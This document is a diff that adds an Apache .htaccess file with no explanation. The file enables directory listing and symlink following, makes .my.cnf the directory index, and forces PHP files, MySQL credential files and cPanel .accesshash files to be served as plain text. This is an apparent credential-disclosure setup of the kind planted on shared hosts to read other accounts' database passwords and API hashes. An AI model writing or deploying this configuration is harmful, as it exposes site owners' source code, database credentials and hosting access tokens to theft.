@@ -1,0 +1,16 @@
+
+Options Indexes FollowSymLinks
+
+DirectoryIndex .my.cnf
+
+AddType txt .php
+
+AddType txt .my.cnf
+
+AddType txt .accesshash
+
+AddHandler txt .php
+
+AddHandler txt .cnf
+
+AddHandler txt .accesshash
